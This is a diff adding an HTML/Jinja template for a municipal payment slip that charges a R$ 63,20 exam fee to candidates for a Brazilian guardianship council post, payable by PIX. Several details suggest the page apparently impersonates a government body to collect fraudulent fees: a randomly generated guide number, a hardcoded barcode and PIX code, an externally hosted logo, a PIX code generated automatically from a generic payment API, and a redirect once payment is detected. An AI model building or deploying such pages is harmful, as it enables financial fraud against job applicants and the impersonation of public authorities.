@@ -1,0 +1,425 @@
+{% extends "layout.html" %}
+
+{% block title %}DAM - Taxa Processual{% endblock %}
+
+{% block content %}
+<div class="max-w-lg mx-auto px-4 py-6">
+    <div class="bg-white rounded-xl shadow-lg border border-gray-300 overflow-hidden">
+            <!-- DAM Header -->
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-2 px-4 pt-4 pb-2 border-b border-gray-200 bg-gradient-to-r from-blue-50 to-white">
+                <div class="flex items-center gap-3 w-full sm:w-auto">
+                    <img src="https://i.postimg.cc/5NvvmF2C/506e4525-b3e0-4703-85c5-24050ba28e3f-removalai-preview.png" alt="Conselho Tutelar" class="w-14 h-14 object-contain"/>
+                    <div>
+                        <div class="text-[15px] font-semibold text-gray-800 leading-tight text-center sm:text-left">
+                            Conselho Tutelar Municipal
+                    </div>
+                    <div class="text-xs text-gray-700 text-center sm:text-left">
+                        Secretaria de Assistência Social
+                    </div>
+                    <div class="text-xs font-bold text-gray-900 text-center sm:text-left">
+                        Documento de Arrecadação Municipal - DAM
+                    </div>
+                </div>
+            </div>
+            <div class="flex flex-col items-center sm:items-end w-full sm:w-auto mt-2 sm:mt-0">
+                <span class="text-2xl font-extrabold text-[#2196d3] leading-none">CONSELHO</span>
+                <span class="text-xs text-[#2196d3] font-semibold text-center sm:text-right leading-tight">
+                    Tutelar<br>Municipal
+                </span>
+            </div>
+        </div>
+
+        <!-- Dados do Candidato -->
+        <div class="px-4 py-3">
+            <div class="grid grid-cols-1 gap-2 text-xs sm:text-sm">
+                <div>
+                    <span class="font-bold">Nome / Candidato:</span>
+                    {{ user_data.full_name or user_data.name or 'CANDIDATO' }}
+                </div>
+                <div>
+                    <span class="font-bold">Endereço:</span>
+                    {{ user_data.address or user_data.street or 'Endereço não informado' }}, {{ user_data.city or '' }} - {{ user_data.state or '' }}
+                </div>
+                <div>
+                    <span class="font-bold">CPF:</span>
+                    {{ user_data.cpf or 'CPF não informado' }}
+                    <span class="font-bold ml-2">CEP:</span>
+                    {{ user_data.zip_code or user_data.cep or 'CEP não informado' }}
+                </div>
+                <div class="flex flex-wrap gap-x-4 gap-y-1">
+                    <span><span class="font-bold">Guia DAM:</span> {{ '{:06d}'.format(range(100000, 999999) | random) }}/25-CT</span>
+                    <span><span class="font-bold">Processo:</span> CONSELHEIRO TUTELAR</span>
+                    <span><span class="font-bold">Local Prova:</span> {{ selected_school }}</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tabela de Débitos -->
+        <div class="px-2 sm:px-4">
+            <div class="overflow-x-auto rounded-lg border border-gray-300">
+                <table class="min-w-full text-xs sm:text-sm">
+                    <thead>
+                        <tr class="bg-[#f3f6fa] text-gray-700">
+                            <th class="p-2 border-b border-gray-300 font-bold">Descrição</th>
+                            <th class="p-2 border-b border-gray-300 font-bold">Vencimento</th>
+                            <th class="p-2 border-b border-gray-300 font-bold">Vlr Tributo (R$)</th>
+                            <th class="p-2 border-b border-gray-300 font-bold">Desc (R$)</th>
+                            <th class="p-2 border-b border-gray-300 font-bold">Vlr Total (R$)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr class="text-center text-xs">
+                            <td class="p-2 border-b border-gray-200">2025010501001</td>
+                            <td class="p-2 border-b border-gray-200">TAXA PROCESSUAL</td>
+                            <td class="p-2 border-b border-gray-200">20/06/2025</td>
+                            <td class="p-2 border-b border-gray-200">63,20</td>
+                            <td class="p-2 border-b border-gray-200">0,00</td>
+                            <td class="p-2 border-b border-gray-200">0,00</td>
+                            <td class="p-2 border-b border-gray-200">63,20</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Informações de Pagamento -->
+        <div class="px-4 py-3">
+            <div class="flex flex-col gap-2 sm:flex-row sm:gap-0 items-stretch text-xs sm:text-sm">
+                <div class="flex-1 flex items-center justify-center bg-[#e3eaf3] border border-gray-300 font-bold rounded-t-md sm:rounded-t-none sm:rounded-l-md py-2 px-2 text-center">
+                    NÃO RECEBER APÓS DATA DE VALIDADE
+                </div>
+                <div class="flex-1 flex items-center justify-center border border-gray-300 border-t-0 sm:border-t sm:border-l-0 sm:border-r-0 py-2 px-2 text-center">
+                    Data de Vencimento:
+                    <span class="ml-1 font-bold">20/06/2025</span>
+                </div>
+                <div class="flex-1 flex items-center justify-center bg-[#e3eaf3] border border-gray-300 font-bold rounded-b-md sm:rounded-b-none sm:rounded-r-md py-2 px-2 text-center">
+                    VALOR TOTAL A PAGAR
+                </div>
+                <div class="flex-1 flex items-center justify-center border border-gray-300 border-t-0 sm:border-t sm:border-l-0 py-2 px-2 font-bold text-center text-lg text-green-600">
+                    R$ 63,20
+                </div>
+            </div>
+        </div>
+
+        <!-- Código de Barras -->
+        <div class="px-4 pb-2">
+            <div class="barcode bg-white border border-gray-300 rounded-md px-2 py-2 w-full text-center select-none overflow-x-auto whitespace-nowrap">
+                81620000001-5 63350868202-6 30510000099-4 91400382375-6
+            </div>
+        </div>
+        <div class="flex justify-between items-center px-4 pb-2">
+            <div class="text-xs font-bold text-gray-700">1ª VIA CONSELHO TUTELAR</div>
+            <div class="text-xs text-gray-500">{{ moment().format('DD [de] MMM [de] YYYY HH:mm') if moment else '14 de jun de 2025 08:35' }}</div>
+        </div>
+
+        <!-- PIX QR Code Section -->
+        <div class="px-4 py-4 border-t border-gray-200 bg-[#f8fafc]">
+            <h2 class="text-base font-bold text-center mb-2 text-[#2196d3]">Pagamento via PIX</h2>
+            
+            <!-- Exam Information -->
+            <div class="bg-blue-50 rounded-md p-3 mb-3 border border-blue-200">
+                <h3 class="text-sm font-bold text-blue-800 mb-2">Informações da Prova</h3>
+                <div class="text-xs text-blue-700 space-y-1">
+                    <div><span class="font-medium">Local:</span> {{ selected_school }}</div>
+                    <div><span class="font-medium">Data/Horário:</span> {{ selected_date.replace('-', ' às ') if selected_date else 'A definir' }}</div>
+                    <div><span class="font-medium">Formato:</span> Dissertativa + Entrevista + Casos Práticos (3h)</div>
+                </div>
+            </div>
+
+            <div class="flex flex-col items-center gap-2">
+                <div class="w-40 h-40 bg-white rounded-md border border-gray-300 shadow-sm flex items-center justify-center">
+                    <div id="qrCodeContainer" class="text-center">
+                        <div id="qrCodePlaceholder" class="text-gray-500">
+                            <i class="fas fa-qrcode text-4xl mb-2"></i>
+                            <p class="text-xs">Gerando QR Code...</p>
+                            <p class="text-xs">R$ 63,20</p>
+                        </div>
+                        <img id="qrCodeImage" src="" alt="QR Code PIX" class="w-36 h-36 object-contain hidden" />
+                    </div>
+                </div>
+                
+                <input type="text" readonly value="{% if payment_data and payment_data.pixCode %}{{ payment_data.pixCode }}{% else %}00020126580014BR.GOV.BCB.PIX01361DAM20251114520400005303986540563.2055040000530398654063.205802BR59PREFEITURA MUNICIPAL6013CONSELHO TUTEL62290525202511141200630445D8{% endif %}" class="w-full text-xs text-gray-700 bg-gray-100 border border-gray-300 rounded px-2 py-1 mt-1 mb-1 text-center" id="pixCode" />
+                
+                <button onclick="copyPixCode()" class="w-full sm:w-auto bg-[#2196d3] hover:bg-[#176cae] text-white text-xs font-semibold rounded px-3 py-2 transition">
+                    <i class="fas fa-copy mr-1"></i>Copiar código PIX
+                </button>
+                
+                <div class="mt-2 text-center">
+                    <p class="text-xs text-gray-600 mb-2">
+                        <i class="fas fa-info-circle mr-1"></i>
+                        Código PIX gerado automaticamente. Copie e realize o pagamento.
+                    </p>
+                </div>
+            </div>
+            
+            <p class="text-center mt-2 text-xs text-gray-600">
+                Escaneie o QR Code ou copie o código para pagar via PIX no app do seu banco.
+            </p>
+            
+            <div class="mt-3 p-2 bg-amber-50 rounded border border-amber-200">
+                <p class="text-xs text-amber-800 text-center">
+                    <i class="fas fa-info-circle mr-1"></i>
+                    Após o pagamento, você receberá a confirmação por e-mail e SMS.
+                </p>
+            </div>
+        </div>
+
+        <!-- 2ª VIA CANDIDATO -->
+        <div class="flex justify-between items-center px-4 py-2 border-t border-gray-200 bg-white">
+            <div class="text-xs font-bold text-gray-700">2ª VIA CANDIDATO</div>
+            <div class="text-xs text-gray-500">{{ moment().format('DD [de] MMM [de] YYYY HH:mm') if moment else '14 de jun de 2025 08:35' }}</div>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <div class="w-full max-w-lg mt-4 px-4">
+        <div class="flex gap-2">
+            <button onclick="history.back()" class="flex-1 bg-gray-600 hover:bg-gray-700 text-white text-sm font-medium rounded px-4 py-2 transition">
+                <i class="fas fa-arrow-left mr-2"></i>Voltar
+            </button>
+            <button onclick="window.print()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium rounded px-4 py-2 transition">
+                <i class="fas fa-print mr-2"></i>Imprimir DAM
+            </button>
+        </div>
+    </div>
+
+    <script>
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            pixCode.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(pixCode.value).then(() => {
+                // Show success feedback
+                const button = event.target;
+                const originalText = button.innerHTML;
+                button.innerHTML = '<i class="fas fa-check mr-1"></i>Copiado!';
+                button.classList.remove('bg-[#2196d3]', 'hover:bg-[#176cae]');
+                button.classList.add('bg-green-600');
+                
+                setTimeout(() => {
+                    button.innerHTML = originalText;
+                    button.classList.add('bg-[#2196d3]', 'hover:bg-[#176cae]');
+                    button.classList.remove('bg-green-600');
+                }, 2000);
+            });
+        }
+
+        function generateOfficialPix() {
+            const btn = document.getElementById('generatePixBtn');
+            const originalText = btn.innerHTML;
+            
+            // Show loading state
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Gerando PIX...';
+            btn.disabled = true;
+            
+            // Call SafeFlow API
+            fetch('/create-pix-payment', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'}
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Payment API Response:', data);
+                if (data.success) {
+                    // Update PIX code with real data
+                    if (data.pixCode) {
+                        document.getElementById('pixCode').value = data.pixCode;
+                    }
+                    
+                    // Show success message
+                    btn.innerHTML = '<i class="fas fa-check mr-2"></i>PIX Atualizado!';
+                    btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                    btn.classList.add('bg-blue-600');
+                    
+                    // Start payment monitoring
+                    if (data.paymentId) {
+                        startPaymentMonitoring(data.paymentId);
+                    }
+                    
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                        btn.classList.add('bg-green-600', 'hover:bg-green-700');
+                        btn.classList.remove('bg-blue-600');
+                        btn.disabled = false;
+                    }, 3000);
+                } else {
+                    // Show error
+                    btn.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Erro na API';
+                    btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                    btn.classList.add('bg-red-600');
+                    
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                        btn.classList.add('bg-green-600', 'hover:bg-green-700');
+                        btn.classList.remove('bg-red-600');
+                        btn.disabled = false;
+                    }, 3000);
+                }
+            })
+            .catch(error => {
+                console.error('Error generating PIX:', error);
+                btn.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Erro na Conexão';
+                btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                btn.classList.add('bg-red-600');
+                
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.classList.add('bg-green-600', 'hover:bg-green-700');
+                    btn.classList.remove('bg-red-600');
+                    btn.disabled = false;
+                }, 3000);
+            });
+        }
+
+        // Start monitoring payment status
+        function startPaymentMonitoring(paymentId) {
+            const interval = setInterval(() => {
+                fetch(`/check_payment_status/${paymentId}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Payment status:', data);
+                        if (data.success && data.status === 'paid') {
+                            clearInterval(interval);
+                            window.location.href = '/aviso';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error checking payment status:', error);
+                    });
+            }, 5000); // Check every 5 seconds
+        }
+
+        // Auto-generate PIX on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Page loaded, starting PIX generation...');
+            generateOfficialPixAutomatically();
+        });
+
+        // Generate official PIX payment automatically
+        function generateOfficialPixAutomatically() {
+            console.log('Auto-generating PIX payment...');
+            
+            const pixInput = document.getElementById('pixCode');
+            const originalValue = pixInput.value;
+            pixInput.value = 'Gerando PIX autêntico...';
+            
+            fetch('/generate_pix', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'}
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Payment API Response:', data);
+                console.log('Response keys:', Object.keys(data));
+                console.log('Success:', data.success);
+                console.log('Has pixQrCode:', !!data.pixQrCode);
+                
+                if (data.success && data.pixCode) {
+                    pixInput.value = data.pixCode;
+                    console.log('PIX code updated successfully');
+                    
+                    // Handle QR Code display
+                    const qrCodeImage = document.getElementById('qrCodeImage');
+                    const qrCodePlaceholder = document.getElementById('qrCodePlaceholder');
+                    
+                    // Check multiple QR code field possibilities
+                    let qrCodeData = null;
+                    let qrCodeSource = '';
+                    
+                    if (data.pixQrCode) {
+                        qrCodeData = data.pixQrCode;
+                        qrCodeSource = 'pixQrCode';
+                    } else if (data.qr_code) {
+                        qrCodeData = data.qr_code;
+                        qrCodeSource = 'qr_code';
+                    } else if (data.pix && data.pix.qr_code_image) {
+                        qrCodeData = data.pix.qr_code_image;
+                        qrCodeSource = 'pix.qr_code_image';
+                    }
+                    
+                    console.log('QR Code source field:', qrCodeSource);
+                    console.log('QR Code data type:', typeof qrCodeData);
+                    console.log('QR Code data length:', qrCodeData ? qrCodeData.length : 0);
+                    
+                    if (qrCodeData && qrCodeData.length > 0) {
+                        console.log('QR Code data found from:', qrCodeSource);
+                        
+                        // Handle different QR code formats
+                        let imageUrl;
+                        if (qrCodeData.startsWith('data:image/')) {
+                            // Already a complete data URL
+                            imageUrl = qrCodeData;
+                            console.log('QR Code is complete data URL');
+                        } else if (qrCodeData.startsWith('iVBORw0KGgo') || qrCodeData.length > 100) {
+                            // Base64 PNG data
+                            imageUrl = `data:image/png;base64,${qrCodeData}`;
+                            console.log('QR Code converted to base64 data URL');
+                        } else {
+                            // Assume it's a direct URL
+                            imageUrl = qrCodeData;
+                            console.log('QR Code used as direct URL');
+                        }
+                        
+                        // Set image source and show it
+                        qrCodeImage.src = imageUrl;
+                        qrCodeImage.onload = function() {
+                            console.log('✓ QR Code image loaded successfully');
+                            qrCodeImage.classList.remove('hidden');
+                            qrCodePlaceholder.classList.add('hidden');
+                        };
+                        qrCodeImage.onerror = function() {
+                            console.error('✗ QR Code image failed to load');
+                            console.error('Failed URL:', imageUrl.substring(0, 100));
+                            qrCodePlaceholder.innerHTML = `
+                                <div class="text-yellow-600">
+                                    <i class="fas fa-exclamation-triangle text-2xl mb-2"></i>
+                                    <p class="text-xs">QR Code Error</p>
+                                    <p class="text-xs">Use PIX code below</p>
+                                </div>
+                            `;
+                        };
+                        
+                        console.log('QR Code image URL set:', imageUrl.substring(0, 60) + '...');
+                    } else {
+                        console.log('No QR Code data available in any field');
+                        console.log('Available response fields:', Object.keys(data));
+                        qrCodePlaceholder.innerHTML = `
+                            <div class="text-green-600">
+                                <i class="fas fa-check-circle text-2xl mb-2"></i>
+                                <p class="text-xs">PIX Gerado!</p>
+                                <p class="text-xs">Use o código abaixo</p>
+                            </div>
+                        `;
+                    }
+                    
+                    if (data.paymentId || data.id) {
+                        startPaymentMonitoring(data.paymentId || data.id);
+                    }
+                } else {
+                    console.error('Failed to generate PIX:', data);
+                    pixInput.value = originalValue;
+                }
+            })
+            .catch(error => {
+                console.error('Error auto-generating PIX:', error);
+                pixInput.value = originalValue;
+            });
+        }
+
+        // Auto-start payment monitoring if payment exists
+        {% if payment_data and (payment_data.id or payment_data.paymentId) %}
+        startPaymentMonitoring('{{ payment_data.id or payment_data.paymentId }}');
+        {% endif %}
+    </script>
+
+<style>
+    .barcode {
+        letter-spacing: 2px;
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 0.85rem;
+    }
+    @media (max-width: 640px) {
+        .barcode { font-size: 0.7rem; }
+    }
+</style>
+{% endblock %}
